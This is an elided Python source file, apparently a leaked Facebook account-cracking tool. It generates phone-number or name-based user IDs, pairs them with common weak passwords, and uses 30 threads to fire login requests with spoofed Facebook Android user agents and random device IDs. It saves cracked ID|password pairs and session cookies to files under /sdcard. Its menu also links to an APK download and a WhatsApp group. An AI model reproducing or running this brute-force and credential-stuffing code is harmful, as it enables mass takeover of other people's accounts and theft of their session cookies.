#SOURCE LEAKED BY :MR-AKASH
#REASON : BECAUSE LOL KING
#WAS INTERFERE BETWEEN
#Aitzaz & AKASH KING FIGHT 
from os import path
...
--------------------------------------------------------
UPDATED VERSION OK 4K95HKING
--------------------------------------------------------
ONLY COPYPASTE IS REAL
\033[1;37m--------------------------------------------------------""")
def linex():
        print('\033[1;37m--------------------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/EwRNlHx9bgJ0HL5fpVXP3K/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-openhttps://www.youtube.com/watch?v=S9FozmRsJPMl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+7617205755&text="
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: +91789,+91602,+91628,+91629')
                ...
                with tred(max_workers=30) as Akash:     
                        ...
                        for psx in user:
                                ...
                                passlist = ['57273200','59039200',psx,ids]
...
def bd():
                ...
                with tred(max_workers=30) as Akash:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'@@@###','708090','55667788','506070','jannat','112244']
                                Akash.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: alok, azad, rehan, marcos\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: rehan, khan, ali \033[1;97m')
                linex()
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [AKASHG-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKASH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [FUCKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                #ua_string = f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                ua_string = f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/338919015;FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1901;FBSV/11;FBOP/1;FBDM/'+'{density=2.0,width=720,height=1406};FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {"adid": adid,
                                        "format": "json",
                                ...
                                if 'session_key' in po:
                                        uid=str(po['uid'])
                                        try:
                                                okk=open('/sdcard/AKASH-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [FUCKED] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AKASH-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        ...
                                                        open('/sdcard/AKASH-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AKASH-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AKASH-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
